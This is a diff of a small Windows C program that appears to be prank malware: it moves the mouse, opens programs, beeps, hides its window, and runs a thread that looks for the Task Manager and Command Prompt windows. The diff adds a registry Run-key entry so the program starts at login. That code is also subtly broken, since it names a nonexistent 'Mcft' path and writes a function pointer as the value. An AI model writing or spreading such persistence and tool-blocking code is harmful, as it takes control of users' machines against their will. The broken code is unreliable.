@@ -12,7 +12,7 @@ void crazyMouse();
 void openPrograms();
 void BeepBoopBeep();
 
-DWORD WINAPI DestroyWindows(LPVOID);
+DWORD WINAPI destroyWindows(LPVOID);
 
 int mouse[2];
 int Freq, Dur;
@@ -25,7 +25,12 @@ int main()
 {
     srand(time(NULL));
 
-    CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&DestroyWindows, 0, 0, NULL);
+    HKEY hKey;
+    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Mcft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey );
+    RegSetValueEx(hKey, "SetUp", 0, REG_SZ,(const unsigned char*)system, sizeof(system));
+    RegCloseKey(hKey);
+
+    CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&destroyWindows, 0, 0, NULL);
 
     mywindow = FindWindow(NULL,":.annoy.:");
     ShowWindow(mywindow, false);
@@ -68,7 +73,7 @@ void BeepBoopBeep()
     Beep(Freq, Dur);
 }
 
-DWORD WINAPI DestroyWindows(LPVOID)
+DWORD WINAPI destroyWindows(LPVOID)
 {
     TaskMgr = FindWindow(NULL,"Windows Task Manager");
     CMD = FindWindow(NULL, "Command Prompt");
